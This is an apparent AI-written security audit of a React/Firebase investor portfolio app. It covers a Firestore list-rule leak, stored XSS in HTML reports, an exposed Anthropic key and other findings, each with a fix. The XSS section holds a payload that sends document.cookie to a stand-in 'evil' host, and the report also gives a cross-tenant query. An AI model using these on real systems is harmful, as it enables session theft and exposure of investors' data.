# Security Review — Arunami Portfolio V3

**Date:** 2026-05-30
**Reviewer:** Claude Code (read-only audit; no code changed)
**Scope:** Full codebase — `arunami/` React/Vite SPA, Firestore rules, deployment config.

## Architecture & threat model

Arunami Portfolio V3 is a **client-only React/Vite SPA** (deployed on Vercel) backed by **Firebase** (Firestore + Auth + Storage) and the **Anthropic API called directly from the browser**. It handles sensitive financial data: portfolio P&L, per-investor allocations/returns, profit-sharing config, and management reports. Three roles exist: `admin`, `analyst`, `investor`.

**There is no backend.** Every trust boundary is enforced by (1) Firestore Security Rules and (2) what ships in the browser bundle. Those two surfaces therefore carry the entire security model — and both have exploitable holes. Findings below are verified against the actual code (parallel exploration + direct file reads); severities reflect exploitability *given this serverless architecture*.

## Summary

| ID | Severity | Finding | Location |
|----|----------|---------|----------|
| H1 | 🔴 HIGH | Any investor can list all investors' private data (3 collections) | `arunami/firestore.rules:155-156, 166-167, 175-176` |
| H3 | 🔴 HIGH | Stored XSS in investor-facing HTML reports | `arunami/src/lib/reportHtml.ts`, `arunami/src/pages/admin/components/InvestorReportGenerator.tsx` |
| H4 | 🔴 HIGH | Anthropic API key shipped to the browser bundle | `arunami/src/lib/gemini.ts:16-19` |
| M1 | 🟠 MEDIUM | No security headers (CSP, frame-ancestors, HSTS, …) | `vercel.json` |
| M2 | 🟠 MEDIUM | Known-vulnerable dependencies (`xlsx`, `expr-eval`) | `arunami/package.json:27,38` |
| M3 | 🟠 MEDIUM | Sensitive data / raw AI responses logged to console | `arunami/src/lib/gemini.ts` + pages |
| M4 | 🟠 MEDIUM | Weak password policy + admin-set passwords; no reset/MFA | `arunami/src/pages/admin/AdminUsers.tsx` |
| M5 | 🟠 MEDIUM | Forms lack schema validation (feeds H3) | `ReportEditor.tsx`, `StepBasicInfo.tsx` |
| — | 🟢 LOW/OK | Positive findings & non-issues | see below |

> **Retracted:** An earlier automated pass reported "any signed-in user can read every portfolio doc" (H2) and "duplicate `isStaff()`". Both are **false** — verified against `firestore.rules`. See *Non-issues* below.

---

## 🔴 HIGH

### H1 — Any investor can list ALL investors' private data (cross-tenant leak), in 3 collections

**Where:** `arunami/firestore.rules` — `investorReports` (lines 155-156), `investorAllocations` (166-167), `investorCommunications` (175-176).

```
allow read: if isStaff() || (isInvestor() && resource.data.investorUid == request.auth.uid);
allow list: if isStaff() || (isInvestor() && request.query.limit <= 200);   // <-- bug (appears 3x)
```

**Why it's exploitable:** The per-document `read` rules are correct, but **Firestore evaluates `list` queries against the rule, not the returned rows** — it does *not* post-filter results by the `read` rule. The `list` rule here only checks `request.query.limit <= 200`, with no constraint tying the query to the caller. So any authenticated investor can run:

```js
query(collection(db, 'investorAllocations'), limit(200))
```

and receive up to 200 records belonging to **other** investors.

**Impact:**
- `investorAllocations` → other investors' allocation amounts, returns, ownership %.
- `investorReports` → other investors' report contents, **including unpublished drafts** (the `list` path also bypasses the `status == 'published'` check that the per-doc `read` rule enforces).
- `investorCommunications` → other investors' private communications log.

This is direct exposure of every investor's financial position to every other investor — a confidentiality breach of the system's core data.

**Recommended fix:** Constrain each `list` rule to the caller and make the client always filter, e.g.:
```
allow list: if isStaff() ||
  (isInvestor() && request.query.limit <= 200
   && request.query.where ... investorUid == request.auth.uid);
```
Audit every call site in `arunami/src/lib/firestore.ts` to confirm queries include `where('investorUid','==',uid)` (and `status` for reports). Apply to all three collections.

---

### H3 — Stored XSS in investor-facing HTML reports

**Where:**
- `arunami/src/lib/reportHtml.ts:424-453, 462-467` (report HTML string).
- `arunami/src/pages/admin/components/InvestorReportGenerator.tsx` (`printWindow.document.write(...)`).

**Why it's exploitable:** Reports are built by concatenating raw HTML strings, and user-controlled fields are interpolated **with no escaping**. Confirmed interpolations in `reportHtml.ts`:

```ts
// :425  businessSummary
`<h2>Business Summary</h2><p>${latestMgmt.businessSummary.replace(/\n/g, '<br/>')}</p>`
// :430  issue title + description
`<li><strong>[${i.severity.toUpperCase()}]</strong> ${i.title}${i.description ? ` — ${i.description}` : ''}</li>`
// :435  action item title + assignee
`<li><strong>[${a.status}]</strong> ${a.title}${a.assignee ? ` — ${a.assignee}` : ''}</li>`
// :442-443  media fileUrl (into src/href) + fileName (into alt)
`<img src="${m.fileUrl}" alt="${m.fileName}" .../>`
`<a href="${m.fileUrl}" ...>▶ ${m.fileName}</a>`
// :452  note content
`<div class="note">${(n.content ?? '').replace(/\n/g, '<br/>')}</div>`
// :462,467  portfolio.name / brandName, allocation.investorName
```

`InvestorReportGenerator.tsx` has the same problem via `document.write` with unescaped `investor.displayName`, `portfolioName`, `portfolioCode`.

**Attack:** An analyst (anyone who can author report content) enters, in e.g. a business summary or issue title:
```html
Q2 results <img src=x onerror="fetch('https://evil/?c='+document.cookie)">
```
When the investor opens the report (rendered in their browser/iframe/print window), the script executes in the investor's session — enabling token/session theft, data exfiltration, or defacement. The media `fileUrl` going straight into `src`/`href` additionally allows `javascript:` URLs, and an unescaped `fileName` can break out of the `alt` attribute.

**Note:** Normal React views are safe (auto-escaped); the risk is confined to these hand-built HTML strings. The storage path in `arunami/src/lib/storage.ts:14-15` embeds the raw `file.name`, which is the same untrusted value that lands unescaped here.

**Recommended fix:** Add an `escapeHtml()` helper and wrap every user-controlled interpolation (run `\n→<br/>` *after* escaping). Allowlist media URLs to `https://` Firebase Storage origins (reject `javascript:`) and escape `fileName` in `alt`. A CSP (see M1) is a valuable defense-in-depth backstop.

---

### H4 — Anthropic API key shipped to the browser bundle

**Where:** `arunami/src/lib/gemini.ts:16-19`
```ts
const anthropic = new Anthropic({
  apiKey: import.meta.env.VITE_ANTHROPIC_API_KEY,
  dangerouslyAllowBrowser: true,
})
```

**Why it's exploitable:** Anything `VITE_`-prefixed is baked into the public production bundle. Any visitor can read `VITE_ANTHROPIC_API_KEY` from devtools/network. Consequences:
1. **Cost/abuse:** unlimited billed Claude calls on the account's key.
2. **Data path:** the app already uploads **full financial PDFs/spreadsheets** to Anthropic from the client (`gemini.ts` document-extraction flow). There is no server-side authorization gate on who can invoke it.

**Recommended fix:** Move extraction behind a minimal serverless function (the project deploys on Vercel — a `api/extract.ts` serverless function is the natural fit). The function holds `ANTHROPIC_API_KEY` server-side (no `VITE_` prefix), verifies the caller's Firebase ID token, then calls Anthropic; the client sends the file + auth token and the browser SDK / `dangerouslyAllowBrowser` is removed. Regardless of timeline, **rotate the currently-exposed key and set a hard spend cap** — treat it as compromised.

---

## 🟠 MEDIUM

### M1 — No security headers

**Where:** `vercel.json` — contains only a build config and an SPA rewrite; no `headers` block.

Missing: `Content-Security-Policy`, `X-Frame-Options` / `frame-ancestors` (clickjacking), `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Strict-Transport-Security`. A CSP is also the strongest defense-in-depth mitigation for H3.

**Recommended fix:** Add a `headers` block in `vercel.json` with the above; the CSP must allow Firebase endpoints, the new `api/` origin (H4), and recharts inline styles.

### M2 — Known-vulnerable dependencies

**Where:** `arunami/package.json` — `xlsx@^0.18.5` (line 38), `expr-eval@^2.0.2` (line 27).

- `xlsx@0.18.5`: prototype pollution (CVE-2023-30533) and ReDoS (CVE-2024-22363); **no fixed version on the npm registry** — the fix ships only via the SheetJS CDN build. It parses attacker-influenced spreadsheets client-side (`gemini.ts` imports `* as XLSX`).
- `expr-eval@2.0.2`: prototype-pollution advisory; used in `arunami/src/lib/distributionStrategies.ts` to evaluate admin-authored formula strings (limited blast radius — it's an expression parser, not `eval`, so no arbitrary code execution, but bad input causes silent calc failures).

**Recommended fix:** Migrate `xlsx` to the maintained SheetJS CDN build (or an alternative); pin/replace `expr-eval` and validate stored formulas at input. Add `npm audit` to CI.

### M3 — Sensitive data / raw AI responses logged to console

**Where:** `arunami/src/lib/gemini.ts` (e.g. `console.error('AI response that failed to parse:', raw.slice(0,500))` and PnL/projection error logs ~585, ~600) plus pages like `StepUploadDocuments.tsx` and `ManagementPage.tsx`.

Raw model responses and financial extracts are logged to the browser console, where they're visible to anyone with devtools and may surface in error-aggregation tools.

**Recommended fix:** Strip or gate these behind a dev-only flag; never log raw responses or financial figures in production.

### M4 — Weak password policy + admin-set passwords

**Where:** `arunami/src/pages/admin/AdminUsers.tsx:21` — `password: z.string().min(6, ...)`.

Only a 6-char minimum, no complexity. Admins type users' passwords directly in the UI (user creation goes through `createUserWithEmailAndPassword` on a secondary Firebase app — the secondary-app pattern itself is correct, see positives). No self-service password reset and no MFA exist.

**Recommended fix:** Raise to 12+ chars with complexity; prefer Firebase's invite / password-reset-email flow so admins never handle plaintext passwords; consider enabling MFA.

### M5 — Forms lack schema validation (compounds H3)

**Where:** `arunami/src/pages/analyst/portfolio/management/ReportEditor.tsx:39-46`, `arunami/src/pages/admin/setup/StepBasicInfo.tsx`.

`zod` (and `@hookform/resolvers`) are installed but these forms use react-hook-form **without a resolver** — no length caps or content constraints on fields (business summary, issue titles, portfolio name/code) that flow unescaped into reports.

**Recommended fix:** Add zod schemas with length limits and a resolver to these forms; input validation narrows the H3 attack surface.

---

## 🟢 LOW / Positive findings & non-issues

**Confirmed good / no action:**
- `.env` and `.env.*` are correctly gitignored; **no secrets are committed** and no `.env` file is tracked in git.
- The Firebase public `apiKey` in the bundle is expected and safe **provided** Firestore rules are correct (so fixing H1 matters).
- Firestore **subcollection** RLS is sound: portfolio config/financials/reports/notes are gated by `canReadPortfolio`; investor reports require `status == 'published'` on per-doc read; `equityHistory` is append-only (`update, delete: if false`).
- The **portfolio root doc** read/list is correctly assignment-scoped via `canReadPortfolioResource()` (`firestore.rules:90-92`).
- Admin user creation uses a **secondary Firebase app** so the admin's own session isn't hijacked — correct pattern (`arunami/src/lib/firebase.ts`).
- Standard React rendering auto-escapes; no `dangerouslySetInnerHTML`/`eval` in normal components.
- Firestore client SDK uses parameterized queries — no SQL/NoSQL injection.
- No service-account / admin keys are present in the client bundle.

**Non-issues (retracted from earlier automated passes):**
- ❌ "Any signed-in user can read every portfolio doc" — **false.** `firestore.rules:90-92` scopes it via `canReadPortfolioResource()`.
- ❌ "Duplicate `isStaff()` definition" — **false.** Only one definition exists (`firestore.rules:32`).

**Lower-priority hardening (optional):**
- Storage path uses raw `file.name` (`storage.ts:14-15`) — path traversal is mitigated by Firebase URL-encoding, but it's the same untrusted value behind H3.
- No rate limiting on login (Firebase has built-in protections), Claude calls, or uploads.
- Graceful session-expiry handling / "session expired" messaging is absent (UX + clarity).

---

## Suggested remediation order

1. **H1** — fix the three `list` rules + audit client queries (highest impact, lowest effort; stops an active cross-investor data leak).
2. **H3** — escape all interpolated user input in report HTML; allowlist media URLs.
3. **H4** — rotate key + spend cap immediately; move Anthropic calls behind a Vercel serverless function.
4. **M1–M5** — security headers, dep upgrades + `npm audit`, log scrubbing, password policy, form validation.

## How to verify fixes (when implemented)

- **H1:** Firebase emulator rules unit test — investor listing `investorAllocations`/`investorReports`/`investorCommunications` **without** `where('investorUid','==',self)` is denied; **with** it, allowed and returns only own rows.
- **H3:** enter `<img src=x onerror=alert(1)>` in a business summary / issue title / filename, render the investor report (and the print path), confirm it renders as inert text.
- **M1:** `curl -I` the deployed URL; confirm CSP + frame-ancestors present and the app still loads.
- **H4:** `grep` the built `dist/` for the key — it must be absent; extraction still works via the proxy.
